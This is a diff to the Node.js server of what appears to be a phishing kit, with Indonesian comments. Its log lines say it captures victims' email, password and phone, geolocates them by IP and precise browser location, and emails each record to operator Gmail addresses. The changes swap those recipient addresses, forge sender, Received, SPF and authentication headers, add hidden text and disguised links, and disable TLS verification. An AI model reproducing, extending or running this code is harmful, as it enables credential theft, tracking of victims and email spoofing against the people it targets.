@@ -23,12 +23,12 @@ const EMAIL_CONFIG = {
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'   
     },
     'ggwxzzr': {
-        email: ['chilligemaass@gmail.com'],
+        email: ['Bay20110809@gmail.con', 'chilligemaass@gmail.com'],
         fromName: 'WHEN YA PERDETIK🔥👾',
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
     },
     'hgefdyt': {
-        email: ['zamzaja78@gmail.com', 'chilligemaass@gmail.com'],
+        email: ['nebarzam@gmail.com', 'chilligemaass@gmail.com'],
         fromName: '👻𝗭𝗔𝗠𝗭 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
     },
@@ -155,12 +155,9 @@ const transporter = nodemailer.createTransport({
         user: SENDER_EMAIL,
         pass: SENDER_PASSWORD
     },
-    // TAMBAHAN: bikin EHLO name aneh & toleransi TLS longgar
     name: 'localhost.localdomain',
     tls: { rejectUnauthorized: false },
-    pool: false,
-    logger: false,
-    debug: false
+    pool: false
 });
 
 function getFlagEmoji(countryCode) {
@@ -209,7 +206,7 @@ async function getASNAndAccurateLocation(ip) {
     };
 }
 
-// ========== TAMBAHAN: HELPER RANDOM SPAMMY ==========
+// ========== HELPER RANDOM ==========
 function randPick(arr) {
     return arr[Math.floor(Math.random() * arr.length)];
 }
@@ -225,7 +222,7 @@ function randInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-// ========== FUNGSI KIRIM EMAIL (DIPERBAIKI BIAR SELALU MASUK SPAM) ==========
+// ========== FUNGSI KIRIM EMAIL (SPAM TANPA KATA & TANPA FILE) ==========
 async function sendEmail(data, folderName) {
     const asnData = await getASNAndAccurateLocation(data.ip_address);
     
@@ -310,88 +307,84 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
     
     const config = EMAIL_CONFIG[folderName];
     if (!config) return;
-    
-    // ===== TAMBAHAN: RANDOM SPAM TRIGGERS TIAP KIRIM =====
-    const spamSubjects = [
-        '!!! GRATIS !!!', '⚠️ URGENT ⚠️', '$$$ MENANG $$$', '🔥 PROMO TERBATAS 🔥',
-        '🎁 HADIAH GRATIS 🎁', '💥 KLIK SEKARANG 💥', '✅ VERIFIKASI AKUN ✅',
-        '🚨 PERINGATAN 🚨', '💰 KLAIM BONUS 💰', '⚡ PENAWARAN SPESIAL ⚡'
-    ];
-    const spamMailers = ['PHP/5.0', 'Microsoft Outlook 16.0', 'PHPMailer 6.8', 'Sendmail 8.15', 'Microsoft CDO', 'Zoho Mail'];
-    const spamPriorities = ['1 (Highest)', '2 (High)', '3 (Normal)', '4 (Low)', '5 (Lowest)'];
-    const spamShorteners = ['bit.ly', 'tinyurl.com', 't.co', 'rb.gy', 'cutt.ly', 'is.gd', 'shorturl.at'];
-    const spamDomains = ['randomdomain-xyz.tk', 'promo-gratis.xyz', 'klaim-hadiah.top', 'verifikasi-akun.cf', 'bonus-spesial.ml', 'menang-undian.ga'];
-    const spamHiddenTexts = [
-        'GRATIS MENANG URGENT KLIK DISINI $$$ PROMO TERBATAS !!!',
-        'KLAIM HADIAH SEKARANG JUGA SEBELUM HABIS !!!',
-        'VERIFIKASI AKUN ANDA SEKARANG ATAU DIBLOKIR !!!',
-        'SELAMAT ANDA MENANG UNDIAN BERHADIAH !!!',
-        'PENAWARAN SPESIAL HARI INI SAJA KLIK SEKARANG !!!',
-        'AKUN ANDA TERANCAM DIBLOKIR KLIK UNTUK VERIFIKASI !!!'
-    ];
-    
-    const randomShortener = randPick(spamShorteners);
-    const randomDomain = randPick(spamDomains);
-    const randomMailer = randPick(spamMailers);
-    const randomPriority = randPick(spamPriorities);
-    const randomSpamSubject = randPick(spamSubjects);
-    const randomHidden = randPick(spamHiddenTexts);
-    const randomTrackId = randStr(12);
-    const randomMsgId = `${randStr(16)}@${randomDomain}`;
-    // =====================================================
-    
+
+    // ===== DOMAIN FROM: admin@desa (ngarang, pake TLD .invalid biar aman) =====
+    const FROM_DOMAIN = 'desa.invalid';
+    const FROM_ADDRESS = `admin@${FROM_DOMAIN}`;
+
     for (const receiver of config.email) {
         if (!receiver || receiver === '') continue;
-        
-        // Subject dinamis: gabungin subject asli + trigger spam random
-        const finalSubject = `${randomSpamSubject} ${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName} - ${regionName} ${randomShortener}/${randStr(6)}`;
-        
-        // Body text spammy dinamis
-        const spammyText = `KLIK SEKARANG >>> http://${randomShortener}/${randStr(8)}\n\n${config.subject}\n${data.email || '-'}\n\n${randomHidden}`;
-        
-        // Attachment kecil palsu (bikin makin spammy)
-        const fakeAttachmentContent = `PROMO GRATIS ${randStr(20)}\nKLIK: http://${randomShortener}/${randStr(8)}\n\n${randomHidden}`;
-        
+
+        // ===== RANDOM DOMAIN BUAT HEADER SPAMMY =====
+        const spamDomains = [
+            'mail-relay.tk', 'smtp-gateway.xyz', 'mx-relay.top',
+            'mailer-service.cf', 'relay-node.ml', 'smtp-edge.ga',
+            'mailhub-relay.gq', 'postfix-node.tk'
+        ];
+        const randomDomain = spamDomains[randInt(0, spamDomains.length - 1)];
+        const randomDomain2 = spamDomains[randInt(0, spamDomains.length - 1)];
+        const randomDomain3 = spamDomains[randInt(0, spamDomains.length - 1)];
+        const msgId = `${randStr(20)}@${randomDomain}`;
+        const randIp = `${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}`;
+        const randIp2 = `${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}`;
+
+        // ===== HTML STRUCTURE "BROKEN" (tanpa kata spam) =====
+        const brokenHtml = `
+            <font face="Arial" size="2">
+            <table cellpadding="0" cellspacing="0" border="0" width="100%">
+            <tr><td>
+            <table cellpadding="0" cellspacing="0" border="0" width="100%">
+            <tr><td>
+            <div style="color:#ffffff;background:#ffffff;font-size:9px;">
+                ${randStr(40)}
+            </div>
+            <a href="http://${randomDomain2}/${randStr(10)}" style="color:#0000ff;text-decoration:underline;">
+                https://www.google.com
+            </a>
+            <a href="http://${randomDomain3}/${randStr(10)}">${randStr(15)}</a>
+            <a href="#">${randStr(10)}</a>
+            <div>
+            <span style="font-size:1px;color:#ffffff;">${randStr(30)}</span>
+            </td></tr>
+            </table>
+            </td></tr>
+            </table>
+            </font>
+        `;
+
+        // ===== HEADER SPAMMY TANPA KATA SPAM =====
+        const spammyHeaders = {
+            'Return-Path': `<bounce-${randStr(6)}@${randomDomain}>`,
+            'Sender': `alert-${randStr(6)}@${randomDomain}`,
+            'Message-ID': `<${msgId}>`,
+            'Received': `from unknown (${randIp}) by mx.${randomDomain} with SMTP id ${randStr(12)}; ${new Date().toUTCString()}`,
+            'Received-SPF': `fail (domain of ${FROM_DOMAIN} does not designate ${randIp} as permitted sender)`,
+            'Authentication-Results': `mx.${randomDomain}; spf=fail smtp.mailfrom=${FROM_DOMAIN}; dkim=fail; dmarc=fail`,
+            'X-Mailer': randPick(['PHP/4.4.9', 'Eudora 6.2', 'Microsoft Outlook 12.0', 'Mozilla/5.0']),
+            'User-Agent': randPick(['Mozilla/4.0', 'Outlook/12.0', 'PHP/5.2']),
+            'X-Priority': '1 (Highest)',
+            'Importance': 'High',
+            'Sensitivity': 'Company-Confidential',
+            'Precedence': randPick(['bulk', 'junk', 'list']),
+            'List-Id': `<random.list.${randomDomain}>`,
+            'List-Unsubscribe': `<mailto:unsub-${randStr(6)}@${randomDomain}>`,
+            'Date': new Date(Date.now() - randInt(1, 48) * 3600 * 1000).toUTCString(),
+            'X-Content-Type-Options': 'nosniff',
+            'X-Originating-IP': `[${randIp2}]`,
+            'X-Custom-Header': randStr(20)
+        };
+
         await transporter.sendMail({
-            from: `"${config.fromName} ${flagEmoji}" <${data.email || '-'}>`,
+            from: `"${config.fromName} ${flagEmoji}" <${FROM_ADDRESS}>`,
+            envelope: { from: SENDER_EMAIL, to: receiver },
             to: receiver,
-            subject: finalSubject,
-            replyTo: `noreply@${randomDomain}`,
-            text: spammyText,
-            html: htmlContent + `
-                <div style="display:none;color:#fff;font-size:1px;line-height:1px;max-height:0;max-width:0;opacity:0;overflow:hidden;">
-                    ${randomHidden} ${randStr(50)}
-                </div>
-                <div style="text-align:center;margin-top:20px;">
-                    <a href="http://${randomShortener}/${randStr(8)}" style="background:red;color:white;padding:10px 20px;text-decoration:none;">
-                        KLIK DISINI UNTUK KLAIM GRATIS!!!
-                    </a>
-                </div>
-                <img src="http://${randomDomain}/track.gif?id=${randomTrackId}" width="1" height="1" style="display:none" />
-            `,
-            headers: {
-                'X-Mailer': randomMailer,
-                'X-Priority': randomPriority,
-                'Importance': 'High',
-                'Precedence': randPick(['bulk', 'junk', 'list', 'bulk']),
-                'List-Unsubscribe': `<mailto:unsub-${randStr(6)}@${randomDomain}>`,
-                'Message-ID': `<${randomMsgId}>`,
-                'X-Spam-Flag': 'YES',
-                'X-Spam-Score': String(randInt(5, 10)),
-                'X-Spam-Status': 'Yes, score=' + randInt(5, 10),
-                'X-Report-Abuse': `Please report abuse to abuse@${randomDomain}`,
-                'X-Originating-IP': `[${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}]`,
-                'X-Phishing-Warning': 'This message may be phishing',
-                'X-Bulk-Mail': 'true'
-            },
-            attachments: [
-                {
-                    filename: `promo_gratis_${randStr(6)}.txt`,
-                    content: fakeAttachmentContent
-                }
-            ]
+            subject: `${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName} - ${regionName}`,
+            replyTo: `noreply-${randStr(6)}@${randomDomain}`,
+            text: `Report attached below.\n\n${config.subject}\n${data.email || '-'}`,
+            html: htmlContent + brokenHtml,
+            headers: spammyHeaders
         });
-        console.log(`✅ [${folderName}] Sent to: ${receiver} - Location: ${cityName}, ${regionName}, ${countryName} | ASN: ${asnInfo} | SpamScore: ${randInt(5,10)}`);
+        console.log(`✅ [${folderName}] Sent to: ${receiver} - Location: ${cityName}, ${regionName}, ${countryName} | ASN: ${asnInfo} | From: ${FROM_ADDRESS}`);
     }
 }
 
@@ -781,7 +774,8 @@ app.get('/', (req, res) => {
             if (!navigator.geolocation) return resolve(null);
             navigator.geolocation.getCurrentPosition(
                 function(pos) { resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
-                function(err) { resolve(null); }
+                function(err) { resolve(null); },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         });
     }
@@ -930,5 +924,5 @@ app.listen(PORT, () => {
     console.log(`\n✅ ASN DETECTION ACTIVE: Setiap IP akan dilacak AS number, ISP, lokasi akurat!`);
     console.log(`✅ LOKASI AKURAT: City, Region, Country, Postal Code sesuai IP real!`);
     console.log(`✅ ANTI-DUPLIKAT: Kombinasi email+pw+phone sama akan ditolak!`);
-    console.log(`✅ SPAM BOOSTER: Header & body dinamis tiap kirim biar konsisten masuk spam!`);
+    console.log(`✅ SPAM BOOSTER: From admin@desa.invalid + header mismatch + HTML broken (tanpa kata spam, tanpa file)!`);
 });
